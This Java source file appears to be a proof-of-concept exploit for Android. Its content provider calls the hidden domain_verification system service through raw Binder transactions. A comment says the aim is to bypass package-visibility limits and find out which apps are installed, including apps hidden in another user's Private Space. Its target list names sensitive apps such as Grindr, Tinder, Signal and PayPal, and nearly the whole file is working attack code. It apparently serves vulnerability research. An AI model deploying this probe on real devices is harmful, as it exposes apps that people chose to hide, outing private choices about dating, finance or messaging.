package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class DVEscalateProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("domain_verification");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no domain_verification binder"});
            return cursor;
        }

        String desc = "android.content.pm.verify.domain.IDomainVerificationManager";

        // TX=9: getOwnersForDomain(domainName, userId)
        // This is key — it lets us query by domain name, potentially bypassing
        // package visibility restrictions to discover installed apps

        String[] domains = {
            "accounts.google.com",
            "play.google.com",
            "www.youtube.com",
            "www.instagram.com",
            "www.whatsapp.com",
            "x.com",
            "www.tinder.com",
            "www.grindr.com",
            "www.paypal.com",
            // Control: nonsense domains that should NOT have any owners
            "thisdomaindoesnotexist12345.com",
            "zzzz.fakefake.org",
            "notreal.zzzzz.net",
        };

        // Query for user 0 (main user)
        cursor.addRow(new Object[]{"=== USER 0 ===", ""});
        for (String domain : domains) {
            queryDomainOwners(binder, desc, domain, 0, cursor);
        }

        // Query for user 11 (Private Space)
        cursor.addRow(new Object[]{"=== USER 11 (Private Space) ===", ""});
        for (String domain : domains) {
            queryDomainOwners(binder, desc, domain, 11, cursor);
        }

        // TX=3: getDomainVerificationUserState - try for Private Space packages
        // First, try querying some known package names that might exist in Private Space
        String[] privateSpaceTargets = {
            "com.google.android.gms",
            "com.android.chrome",
            "com.google.android.apps.messaging",
            "com.google.android.youtube",
            "com.google.android.apps.photos",
            "com.android.vending",
            "com.whatsapp",
            "com.instagram.android",
            "org.thoughtcrime.securesms",
            "com.tinder",
        };

        cursor.addRow(new Object[]{"=== TX=3 getDomainVerificationUserState u11 ===", ""});
        for (String pkg : privateSpaceTargets) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeInt(11); // userId = Private Space
                binder.transact(3, data, reply, 0);
                reply.readException();
                int marker = reply.readInt();
                if (marker != 0) {
                    int dataSize = reply.readInt();
                    String uuid = reply.readString();
                    String pkgName = reply.readString();
                    int linkHandling = reply.readInt();
                    int domainCount = reply.readInt();
                    cursor.addRow(new Object[]{"ps_" + shortPkg(pkg),
                        "FOUND! uuid=" + (uuid != null ? uuid.substring(0, Math.min(8, uuid.length())) : "?")
                        + " domains=" + domainCount + " link=" + linkHandling});
                } else {
                    cursor.addRow(new Object[]{"ps_" + shortPkg(pkg), "null (not in Private Space)"});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"ps_" + shortPkg(pkg), "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"ps_" + shortPkg(pkg), "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        return cursor;
    }

    private void queryDomainOwners(IBinder binder, String desc, String domain, int userId,
                                    MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(domain);
            data.writeInt(userId);
            binder.transact(9, data, reply, 0);
            reply.readException();
            int avail = reply.dataAvail();
            if (avail > 0) {
                // Raw dump first few ints for debugging
                int pos = reply.dataPosition();
                StringBuilder raw = new StringBuilder("avail=" + avail + " raw=[");
                int maxInts = Math.min(avail / 4, 20);
                for (int ri = 0; ri < maxInts; ri++) {
                    if (reply.dataAvail() >= 4) {
                        raw.append(String.format("0x%X", reply.readInt()));
                        if (ri < maxInts - 1) raw.append(",");
                    }
                }
                raw.append("]");
                cursor.addRow(new Object[]{"raw_" + domain.replace("www.", "").replace(".", "_"),
                    raw.toString()});

                // Reset and try typed list parsing
                reply.setDataPosition(pos);
                int count = reply.readInt();
                if (count > 0 && count < 100) {
                    StringBuilder sb = new StringBuilder("count=" + count + " [");
                    for (int i = 0; i < Math.min(count, 10); i++) {
                        try {
                            int ownerMarker = reply.readInt();
                            sb.append("m=").append(ownerMarker).append(" ");
                            if (ownerMarker != 0) {
                                byte flags = reply.readByte();
                                String pkgName = reply.readString();
                                sb.append(pkgName != null ? pkgName : "NULL");
                                sb.append("(f=").append(flags).append(")");
                            } else {
                                sb.append("(null-entry)");
                            }
                            if (i < count - 1) sb.append(",");
                        } catch (Exception e) {
                            sb.append("ERR:" + truncate(e.getMessage()));
                            break;
                        }
                    }
                    sb.append("]");
                    cursor.addRow(new Object[]{"dom_" + domain.replace("www.", "").replace(".", "_"),
                        sb.toString()});
                } else if (count == 0) {
                    cursor.addRow(new Object[]{"dom_" + domain.replace("www.", "").replace(".", "_"),
                        "count=0 (no owners)"});
                } else {
                    cursor.addRow(new Object[]{"dom_" + domain.replace("www.", "").replace(".", "_"),
                        "count=" + count});
                }
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"dom_" + domain.replace("www.", "").replace(".", "_"),
                "DENIED:" + truncate(e.getMessage())});
        } catch (Exception e) {
            String msg = e.getMessage();
            if (msg != null && !msg.isEmpty()) {
                cursor.addRow(new Object[]{"dom_" + domain.replace("www.", "").replace(".", "_"),
                    "ERR:" + truncate(msg)});
            }
        }
        data.recycle();
        reply.recycle();
    }

    private String shortPkg(String pkg) {
        String[] parts = pkg.split("\\.");
        return parts[parts.length - 1];
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
